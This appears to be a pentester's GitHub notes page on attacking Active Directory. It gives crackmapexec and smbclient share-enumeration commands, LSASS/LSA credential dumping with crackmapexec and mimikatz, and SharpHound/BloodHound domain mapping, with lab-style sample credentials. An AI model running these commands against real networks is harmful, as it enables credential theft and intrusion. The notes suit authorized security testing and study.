

From <https://github.com/TobyDavenn/ActiveDirectory/blob/main/activedirectory.md> 


![image](https://user-images.githubusercontent.com/35967437/200788095-c9c95791-7229-472a-af91-4f677ec7ec08.png)
<h2> Share enumeration </h2> <br>
can use crackmapexec to see smb access - crackmapexec smb ip -u -p --shares <br>
Take interesting shares and place into smbclient - smbclient ////ip//sharename -u --spider
<br>

<h2> Dumping LSSAS </h2><br>
This can be done with mimikatz (shown above defender may block) and also Crackmapexec -- crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa <br>

<h2> BloodHound</h2>
First run bloodhound on attacking machine -- neo4j console <br>
bloodhound -- creds in Onenote <br>

On machine comprimised run sharphound <br>
. .\Downloads\SharpHound.ps1    
Invoke-Bloodhound -CollectionMethod All -Domain ADDDOMAINHERE.local -ZipFileName loot.zip <br>
Inside of Bloodhound search for Upload icon  and import the loot.zip folder
<br>
note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files
<br>
To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from<br>

<h2> Dumping LSA with mimikatz </h2> <br>
download mimikatz to machine (AV might block) <br>
./mimikatz.exe <br>
privilege::debug (ensure you have perms to dump, must be local admin) <br>
lsadump::lsa /patch <br>
